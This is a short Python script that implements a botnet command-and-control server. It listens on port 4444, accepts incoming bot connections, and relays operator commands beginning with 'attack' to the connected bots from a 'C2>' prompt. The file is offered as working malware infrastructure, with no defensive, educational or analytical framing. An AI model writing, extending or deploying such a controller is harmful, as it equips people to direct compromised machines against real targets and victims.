import socket
import threading

HOST = "0.0.0.0"  # listen ip
PORT = 4444

bots = []

def handle_bot(bot):
    while True:
        try:
            command = input("C2> ")  
            if command.startswith("attack"):
                bot.send(command.encode())  
            elif command == "exit":
                bot.close()
                bots.remove(bot)
                break
        except:
            break

def start_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((HOST, PORT))
    server.listen(10)  # accept multiconnect
    print(f"🚀 C2 Server is running at {HOST}:{PORT}")

    while True:
        bot, addr = server.accept()
        print(f"Bot connected at {addr}")
        bots.append(bot)
        threading.Thread(target=handle_bot, args=(bot,)).start()

if __name__ == "__main__":
    start_server()
